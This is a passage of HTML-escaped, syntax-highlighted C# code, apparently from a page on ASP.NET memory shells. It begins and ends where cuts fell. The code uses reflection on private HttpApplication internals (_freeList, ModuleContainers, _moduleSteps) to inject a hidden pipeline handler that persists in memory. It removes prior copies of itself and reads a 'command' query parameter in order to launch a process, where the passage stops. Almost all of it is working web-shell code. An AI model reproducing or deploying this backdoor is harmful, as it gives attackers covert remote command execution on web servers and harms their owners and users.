&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_freeList&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HAFClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;_freeList&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;appFactory&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;_freeList&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;InjectHandler&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HttpApplication&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;InjectHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpApplication&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;list&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GetModuleSteps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ClearInject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;InstallNew&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;GetModuleSteps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpApplication&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;notification&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;Enum&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetValues&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RequestNotification&lt;/span&gt;&lt;span class="p"&gt;))){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;notification_index&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;PipelineModuleStepContainerClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;EventToIndex&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;notification&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;ModuleContainers&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpApplicationClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;ModuleContainers&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;ModuleContainersLength&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Int32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;PipelineModuleStepContainerArrayClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Length&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ModuleContainers&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;ModuleContainersLength&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;++){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;moduleContainer&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PipelineModuleStepContainerArrayClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Get&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ModuleContainers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_moduleSteps&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PipelineModuleStepContainerClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;_moduleSteps&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;moduleContainer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_moduleSteps&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;list&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ListIExecutionStepArrayClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Get&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_moduleSteps&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;notification_index&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;InstallNew&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpApplication&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;syncEventExecutionStep&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SyncEventExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetConstructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpApplication&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EventHandler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;httpApplication&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EventHandler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;CustomHandler&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Add&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;syncEventExecutionStep&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;ClearInject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;list_count&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Count&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;list_count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;++){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;syncEventExecutionStep&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;get_Item&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;syncEventExecutionStep&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Delegate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;SyncEventExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Handler&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;syncEventExecutionStep&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;handler_name&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Method&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeclaringType&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FullName&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;.&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Method&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handler_name&lt;/span&gt; &lt;span class="p"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;ASP.httpmodulememshell_aspx+ModuleMemShell.CustomHandler&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;RemoveAt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;CustomHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;EventArgs&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpContext&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryString&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;command&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
